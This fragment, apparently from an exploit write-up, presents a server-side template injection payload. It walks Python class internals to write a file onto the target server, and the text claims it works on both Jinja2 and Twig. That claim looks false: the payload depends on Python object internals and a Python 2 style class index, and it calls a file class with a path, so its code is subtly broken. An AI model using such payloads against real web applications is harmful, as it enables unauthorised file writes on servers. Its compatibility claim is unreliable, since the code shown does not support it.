...
```python
{{ next(cls for cls in ''.__class__.__mro__[2].__subclasses__() if cls.__name__ == 'TextIOWrapper')('/tmp/ssti.txt','w').write('owned by ssti') }}
```
...
This payload demonstrates compatibility with both Jinja2 and Twig engines, enhancing the exploit’s reach and success rate.
